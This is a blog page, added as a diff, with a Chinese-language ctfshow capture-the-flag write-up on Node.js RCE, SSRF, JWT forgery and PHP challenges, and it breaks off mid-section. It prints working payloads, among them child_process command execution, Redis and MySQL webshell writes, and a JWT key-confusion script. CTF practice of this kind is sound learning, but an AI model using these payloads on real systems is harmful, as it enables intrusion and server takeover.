@@ -1,0 +1,911 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctfshow 杂项：Node.js、SSRF、JWT、文件包含与新手杯题解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 杂项：Node&#x2F;SSRF&#x2F;JWT&#x2F;文件包含">
+<meta property="og:url" content="https://xendr1a.github.io/2025/10/18/ctfshow-misc/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="ctfshow 杂项：Node.js、SSRF、JWT、文件包含与新手杯题解。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xendr1a.github.io/img/ctfshow-misc/img-01.png">
+<meta property="article:published_time" content="2025-10-18T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.956Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="JWT">
+<meta property="article:tag" content="Node.js">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xendr1a.github.io/img/ctfshow-misc/img-01.png">
+  
+  
+  
+  <title>ctfshow 杂项：Node/SSRF/JWT/文件包含 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">ctfshow 杂项：Node/SSRF/JWT/文件包含</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-18 10:00" pubdate>
+          2025年10月18日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow 杂项：Node/SSRF/JWT/文件包含</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>下载源码，改后缀zip然后解压</p>
+<p>账号密码在use.js</p>
+<p>然后注意login.js里面的</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">var findUser = function(name, password)&#123;<br>  return users.find(function(item)&#123;<br>    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;<br>  &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>使用大小写绕过</p>
+<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>试了一下&#x2F;?eval&#x3D;能执行命令但是js的Nodejs的RCE还没学过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">子进程child_process<br>?eval=require(&quot;child_process&quot;).execSync(&#x27;ls&#x27;)<br><br>?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()<br><br>?eval=require(&quot;child_process&quot;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;)<br><br>?eval=require(&#x27;child_process&#x27;).spawnSync( &#x27;ls&#x27;, [ &#x27;./&#x27; ] ).stdout.toString()<br>#.stdout.toString() 从输出流中读取结果。<br>？eval=global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">//读文件夹，读文件函数fs库<br>?eval=require(&#x27;fs&#x27;).readdirSync(&quot;.&quot;)<br>?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;./fl00g.txt&#x27;,&#x27;utf8&#x27;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>不知道过滤了啥反正这个能用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?eval=require(&#x27;fs&#x27;).readdirSync(&quot;.&quot;)<br>?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;./fl00g.txt&#x27;,&#x27;utf8&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p>测试了亿下下，应该是exec的问题</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">?eval=require(&quot;child_process&quot;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;)<br>?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;, [&#x27;./&#x27;] ).stdout.toString()<br>这个能读目录<br>?eval=eval(Buffer.from(&quot;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp&quot;,&#x27;base64&#x27;).toString(&#x27;ascii&#x27;))这个也能绕<br>Buffer.from：将 Base64 字符串还原为原始文本。<br></code></pre></td></tr></table></figure>
+
+<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">数组绕过?a[]=1&amp;b[]=1<br></code></pre></td></tr></table></figure>
+
+<h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>看到login.js</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">var express = require(&#x27;express&#x27;);<br>var router = express.Router();<br>var utils = require(&#x27;../utils/common&#x27;);<br><br>/* GET home page.  */<br>router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;<br>  res.type(&#x27;html&#x27;);<br>  var flag=&#x27;flag_here&#x27;;<br>  var secert = &#123;&#125;;<br>  var sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body); <br>  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;<br>    res.end(flag);<br>  &#125;else&#123;<br>    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br>module.exports = router;<br></code></pre></td></tr></table></figure>
+
+<p>需要一个secert.ctfshow&#x3D;&#x3D;&#x3D;’36dboy’才能获得flag，我们怎么弄到这个类呢</p>
+<p>我们注意到有两个空类secert &#x3D; {}和user &#x3D; {}，以及一个utils.copy(user,req.body);</p>
+<p>我们可以打原型链污染，我对于”proto”的理解就是，把它塞进空的地方，比如说我们这个{“proto”:{“ctfshow”:”36dboy”}}</p>
+<p>他就会自己塞到secert &#x3D; {}；</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">原型链污染<br>&#123;&quot;proto&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351-2"><a href="#web351-2" class="headerlink" title="web351-2"></a>web351-2</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">POST：url=http://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">16进制绕过127-&gt;0x7f<br>url=http://0x7f.0.0.1/flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤了0和1，可以把域名解析到127.0.0.1<br>http://safe.taobao.com/<br>http://114.taobao.com/<br>http://wifi.aliyun.com/<br>http://imis.qq.com/<br>http://localhost.sec.qq.com/<br>http://ecd.tencent.com/<br>http://sudo.cc/<br></code></pre></td></tr></table></figure>
+
+<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><p>域名小于5个</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">直接url=http://0/flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><p>现在是小于3个，还是头上的payload</p>
+<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><p>等个服务器</p>
+<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><p><strong>正则</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>$url=$_POST[&#x27;url&#x27;];<br>$x=parse_url($url);<br>if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;<br>    echo file_get_contents($url);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>就是要有ctf和show</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">url=http://ctf.@127.0.0.1/flag.php#show<br>或者把#换成?<br>当parse_url()解析到邮箱时：@前面是user<br>file_get_contents()会访问host:port/path，与user无关<br></code></pre></td></tr></table></figure>
+
+<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><p>看关键词打无密码的mysql</p>
+<p>查找一下ssrf和无密码的mysql找到<strong>gopher协议</strong></p>
+<p>找到Gopherus工具</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">cd Gopherus<br>./gopherus.py --help<br>./gopherus.py --exploit mysql<br>root<br>select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27; into outfile &#x27;/var/www/html/cmd.php&#x27;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><p>最后一个了，题目提示了打redis</p>
+<p><strong>dict协议功能：</strong></p>
+<p>1、探测内网主机</p>
+<p>2、探测端口的开放情况和指纹信息</p>
+<p>3、执行命令</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">dict://127.0.0.1:6379<br>dict://127.0.0.1:6379/info    #先看需不需要认证,发现不用<br>dict://127.0.0.1:6379/config:set:dir:/var/www/html  #定位到根目录<br>dict://127.0.0.1:6379/set:shell:&quot;\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e&quot; <br>#为了给空格绕过掉所以使用16进制，&lt;?php eval($_POST[1]);?&gt;<br>dict://127.0.0.1:6379/config:set:dbfilename:1.php #创建的文件<br>dict://127.0.0.1:6379/save   #保存<br><br>然后就是在/1.php找flag<br></code></pre></td></tr></table></figure>
+
+<p>然后还有方法二</p>
+<p>利用<strong>gopher协议，和上一题的工具</strong></p>
+<p><img src="/img/ctfshow-misc/img-01.png" alt="4c98ab0f-6c20-4868-bc28-ff084753a079-20250420203357-4jakxei"></p>
+<p>然后进去就行了</p>
+<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><h3 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h3><p>抓包，然后F12有个&#x2F;admin</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDUxNTQ3MDksImV4cCI6MTc0NTE2MTkwOSwibmJmIjoxNzQ1MTU0NzA5LCJzdWIiOiJ1c2VyIiwianRpIjoiNDcwNGU4YTQwZGZhN2NlZmQxYmQyYzBiOWI1ZmY0MDkifV0（因为题目说了JWT<br></code></pre></td></tr></table></figure>
+
+<p>解码得到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1745154709,&quot;exp&quot;:1745161909,&quot;nbf&quot;:1745154709,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;4704e8a40dfa7cefd1bd2c0b9b5ff409&quot;&#125;]<br></code></pre></td></tr></table></figure>
+
+<p>然后把user改为admin然后编码改数据，然后访问&#x2F;admin&#x2F;</p>
+<p><strong>至于为什么访问&#x2F;admin&#x2F;而不是&#x2F;admin，因为访问&#x2F;admin表示访问admin.php而访问&#x2F;admin&#x2F;表示访问的是admin目录下默认的index.php</strong></p>
+<h3 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h3><p>爆破密钥，密钥是123456</p>
+<h3 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h3><p>弱口令爆破密钥，密钥是123456</p>
+<h3 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h3><p>爆破密钥aab</p>
+<h3 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h3><p>给了app.js，发现公钥和私钥可下载，找到jwt伪造直接开搞</p>
+<h3 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h3><p>利用漏洞，修改算法从 非对称算法（比如RS256） 到 对称密钥算法（HS256）<br>双方都使用公钥验签，顺利篡改数据</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">脚本<br>import jwt<br><br>jwt_payload=&#123;<br>  &quot;user&quot;: &quot;admin&quot;,<br>  &quot;iat&quot;: 1732026296<br>&#125;<br><br>pub=open(&quot;C:\\Users\\w的飞行日记\\Downloads\\public.key&quot;,&quot;rb&quot;).read()<br>jwt_headers=&#123;<br>  &quot;alg&quot;: &quot;HS256&quot;,<br>  &quot;typ&quot;: &quot;JWT&quot;<br>&#125;<br><br>jwt_token=jwt.encode(jwt_payload,key=pub,algorithm=&#x27;HS256&#x27;,headers=jwt_headers,)<br><br>print(jwt_token)<br></code></pre></td></tr></table></figure>
+
+<h2 id="新手杯"><a href="#新手杯" class="headerlink" title="新手杯"></a>新手杯</h2><h3 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br><br>$code = $_POST[&#x27;code&#x27;];<br><br>if(isset($code))&#123;<br><br>  $code = str_replace(&quot;?&quot;,&quot;&quot;,$code);<br>  eval(&quot;?&gt;&quot;.$code);<br><br>&#125;<br>code=&lt;script language=&quot;php&quot;&gt;system(&quot;cat /f*&quot;);&lt;/script&gt;<br><br>我们知道php有好几种写法比如<br>&lt;? ... ?&gt;                               需在 php.ini 中开启 short_open_tag=On（默认关闭）<br>&lt;?= ... ?&gt;                              直接输出内容，等效于 &lt;?php echo ...; ?&gt;<br>&lt;% ... %&gt;                               需在 php.ini 中开启 asp_tags=On（默认关闭）。<br>&lt;script language=&quot;php&quot;&gt; ... &lt;/script&gt;   类似 HTML 脚本标签，但已被 PHP 7.0+ 移除。<br>显而易见就只有第四种了<br></code></pre></td></tr></table></figure>
+
+<h3 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h3><p>先下文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">这个是首页<br>如果给name赋值，name`被设置为&quot;test&quot;，全局`id`递增<br>创建`Rookie`对象，然后序列化并保存到&quot;test_info&quot;文件中。<br>@app.route(&quot;/&quot;)<br>def agent_show():<br>    global id<br>    id = id + 1<br><br>    if request.args.get(&quot;name&quot;):<br>        name = request.args.get(&quot;name&quot;)<br>    else:<br>        name = &quot;new_rookie&quot;<br><br>    new_rookie = Rookie(name, id)<br>    try:<br>        file = open(str(name) + &quot;_info&quot;, &#x27;wb&#x27;)<br>        info = pickle.dumps(new_rookie, protocol=0)<br>        info = pickletools.optimize(info)<br>        file.write(info)<br>        file.close()<br>    except Exception as e:<br>        return &quot;error&quot;<br><br>    with open(str(name)+&quot;_info&quot;, &quot;rb&quot;) as file:<br>        user = pickle.load(file)<br><br>    message = &quot;&lt;h1&gt;欢迎来到新手村&quot; + user.name + &quot;&lt;/h1&gt;\n&lt;p&gt;&quot; + &quot;只有成为大菜鸡才能得到flag&quot; + &quot;&lt;/p&gt;&quot;<br>    return message<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">重要的是<br>@app.route(&quot;/dacaiji&quot;)<br>def get_flag():<br>    name = request.args.get(&quot;name&quot;)<br>    with open(str(name)+&quot;_info&quot;, &quot;rb&quot;) as f:<br>        user = pickle.load(f)<br><br>    if user.id != 0:<br>        message = &quot;&lt;h1&gt;你不是大菜鸡&lt;/h1&gt;&quot;<br>        return message<br>    else:<br>        message = &quot;&lt;h1&gt;恭喜你成为大菜鸡&lt;/h1&gt;\n&lt;p&gt;&quot; + flag + &quot;&lt;/p&gt;&quot;<br>        return message<br></code></pre></td></tr></table></figure>
+
+<p>id&#x3D;0就能出flag</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">然后看到<br>@app.route(&quot;/change&quot;)<br>def change_name():<br>    name = base64.b64decode(request.args.get(&quot;name&quot;))<br>    newname = base64.b64decode(request.args.get(&quot;newname&quot;))<br>#从 URL 参数中获取 name 和 newname，并解码为原始字节（例如 name=MQ== → b&quot;1&quot;）。<br>    file = open(name.decode() + &quot;_info&quot;, &quot;rb&quot;)<br>    info = file.read()<br>    print(&quot;old_info ====================&quot;)<br>    